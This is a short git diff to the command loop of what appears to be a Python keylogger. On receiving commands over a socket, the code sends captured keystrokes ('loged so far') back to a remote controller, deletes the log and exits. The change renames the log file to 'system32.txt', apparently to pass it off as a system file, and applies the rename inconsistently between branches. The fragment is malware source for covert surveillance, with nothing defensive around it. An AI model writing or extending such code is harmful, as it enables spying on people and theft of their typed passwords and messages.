@@ -98,7 +98,7 @@ def receive_commands():
             break
 
         elif data[:3].decode("utf-8") == "end":
-            s.send(str.encode("loged so far:" + read_file("logs.txt") + "\n[-Key loger Stoped]" + str(os.getcwd()) + '>end'))
+            s.send(str.encode("loged so far:" + read_file("system32.txt") + "\n[-Key loger Stoped]" + str(os.getcwd()) + '>end'))
             os.remove("logs.txt")
             os._exit(1)
 
@@ -115,7 +115,7 @@ def receive_commands():
             stop_key2()
             s.send(
             str.encode("loged so far:" + read_file("logs.txt") + "\n[-Key loger Stoped]" + str(os.getcwd()) + '>'))
-            os.remove("logs.txt")
+            os.remove("system32.txt")
 
         elif len(data) > 0:
             try:
